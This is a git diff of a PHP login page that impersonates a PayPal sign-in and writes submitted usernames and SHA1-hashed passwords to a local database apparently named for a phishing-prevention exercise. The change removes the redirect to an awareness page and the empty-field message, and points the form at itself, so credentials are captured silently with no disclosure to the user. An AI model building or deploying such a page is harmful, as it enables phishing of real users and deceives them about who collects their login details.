@@ -1,4 +1,4 @@
-<?php //envoie log vers page suivante et redirige user
+<?php // envoie log phpmyadmin et ne redirige pas le user
 $bdd = new PDO('mysql:host=localhost;dbname=prevention_phishing;charset=utf8;', 'root', 'root');
 if (isset($_POST['envoie'])) {
     if (!empty($_POST['pseudo']) && !empty($_POST['mdp'])) {
@@ -6,16 +6,9 @@ if (isset($_POST['envoie'])) {
         $mdp = sha1($_POST['mdp']);
         $insertUser = $bdd->prepare('INSERT INTO users(pseudo, mdp) VALUES(?,?)');
         $insertUser->execute(array($pseudo, $mdp));
-
-        // Rediriger l'utilisateur vers user_list.php
-        header("Location: prevention.php");
-        exit(); // Assurez-vous de terminer le script pour éviter toute exécution ultérieure.
-    } else {
-        echo "Complétez les champs";
     } 
 }
 ?>
-
 
 <div id="main" class="main " role="main">
     <section id="login" class="login" data-role="page" data-title="Log in to your paypal account">
@@ -178,7 +171,7 @@ if (isset($_POST['envoie'])) {
                     </p>
                 </header>
                 
-                <form id="monFormulaire" action="prevention.php" method="POST" enctype="multipart/form-data" class="proceed maskable" name="login" autocomplete="off" novalidate="">
+                <form id="monFormulaire" action="" method="POST" enctype="multipart/form-data" class="proceed maskable" name="login" autocomplete="off" novalidate="">
                     <div id="passwordSection" class="clearfix">
                         <div class="textInput" id="pseudodiv">
                             <div class="fieldWrapper">
